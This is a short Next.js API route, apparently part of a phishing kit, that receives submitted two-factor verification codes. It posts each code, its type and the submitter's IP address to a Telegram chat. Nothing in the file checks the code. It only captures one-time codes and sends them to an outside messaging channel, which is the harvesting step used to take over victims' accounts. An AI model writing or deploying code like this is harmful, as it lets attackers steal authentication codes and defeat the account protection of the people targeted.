import { NextRequest, NextResponse } from 'next/server';
import { sendTelegram } from '@/lib/telegram';

export async function POST(req: NextRequest) {
  const ip =
    req.headers.get('x-forwarded-for')?.split(',')[0].trim() ||
    req.headers.get('x-real-ip') ||
    'Unknown';

  const { type, code } = await req.json();

  const text =
    `✅ <b>Verification Code Submitted</b>\n` +
    `🔒 Type: ${type}\n` +
    `🔢 Code: ${code}\n\n` +
    `🌐 IP: ${ip}`;

  try {
    await sendTelegram(text);
  } catch (err) {
    console.error('[2fa] Telegram error:', err);
    return NextResponse.json({ ok: false, error: String(err) }, { status: 500 });
  }
  return NextResponse.json({ ok: true });
}
